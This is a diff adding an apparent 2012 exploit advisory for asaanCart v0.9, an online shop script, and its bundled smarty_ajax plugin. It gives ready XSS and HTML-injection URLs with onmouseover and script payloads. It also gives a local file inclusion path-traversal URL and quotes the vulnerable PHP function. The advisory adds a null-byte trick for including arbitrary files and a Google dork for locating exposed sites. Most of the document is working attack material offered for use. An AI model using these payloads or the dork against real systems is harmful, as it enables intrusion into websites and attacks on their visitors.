@@ -1,0 +1,41 @@
+______________________________________________________________________________________
+# Exploit Title :[asaanCart XSS/LFI Vulnerabilities]
+# Google Dork   :[intext:"smarty_ajax ? AJAX-enabled Smarty plugins"]Or[inurl:"/smarty_ajax/"]
+# Date          :[14/03/2012]
+# Author        :[Number 7]~ Twitter:[@TunisianSeven]
+                           ~ Blog   :[http://tunisianseven.blogspot.com/]
+# Tested on     :[Linux]
+# Software Link :[http://asaancart.wordpress.com/]
+# Download2     :[http://sourceforge.net/projects/asaancart/]
+# Version:      :[v-0.9]
+______________________________________________________________________________________
+The bug is based on smarty_ajax plugin which is included in this script and other
+scripts as well !
+
+Demo: 
+Html Injection + Cross site scripting:
+(for the xss you must user IExplorer Or mozilla Firefox)
+===>
+http://localhost/asaancart%20v-0.9/libs/smarty_ajax/calc.php/%22onmouseover=prompt(944322)%3E%3Cu%3E%3Cbig%3E%3Cbig%3E%3Cbig%3E%3Cbig%3EInjection%20Here%3C/big%3E%3C/big%3E%3C/big%3E%3C/big%3E%3C/u%3E
+http://localhost/asaancart%20v-0.9/libs/smarty_ajax/chat.php/%22onmouseover=prompt(998415)%3E%3CBig%3E%3Cbig%3E%3Cbig%3E%3Cbig%3E%3Cu%3EHtml%20Injection%20HerE.%3C/u%3E%3C/Big%3E%3C/big%3E%3C/big%3E%3C/big%3E
+http://localhost/asaancart%20v-0.9/libs/smarty_ajax/register.php/%22onmouseover=prompt(970389)%3E%3Cbig%20style=%22color:%20rgb(204,%200,%200);%22%3E%3Cbig%3E%3Cspanstyle=%22font-weight:%20bold;%20font-style:%20italic;%20text-decoration:%20underline;%22%3EHtmlInjection.%3C/span%3E%3C/big%3E%3C/big%3E
+http://localhost/asaancart%20v-0.9/libs/smarty_ajax/index.php/%22onmouseover=prompt(970389)%3E%3Cbig%20style=%22color:%20rgb(204,%200,%200);%22%3E%3Cbig%3E%3Cspanstyle=%22font-weight:%20bold;%20font-style:%20italic;%20text-decoration:%20underline;%22%3EHtmlInjection.%3C/span%3E%3C/big%3E%3C/big%3E
+http://localhost/asaancart%20v-0.9/libs/smarty_ajax/index.php?_=&f=update_intro&page=1%3CScRiPt%20%3Eprompt%28949136%29%3C%2fScRiPt%3E
+
+Local File Include:
+
+Proof:
+http://localhost/libs/smarty_ajax/index.php
+lines: 29->33.
+
+function update_intro() {
+  global $t;
+  header('Content-Type: text/html; charset=windows-1251');
+  $t->display('introduction/' . $_GET['page'] . '.tpl');
+}
+
+Usage[LFI]:
+http://localhost/asaancart%20v-0.9/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../templates\add_product
+It will include the file with .tpl extension !
+you can replace it with file.php%00 Or use your immagination ....
+______________________________________________________________________________________
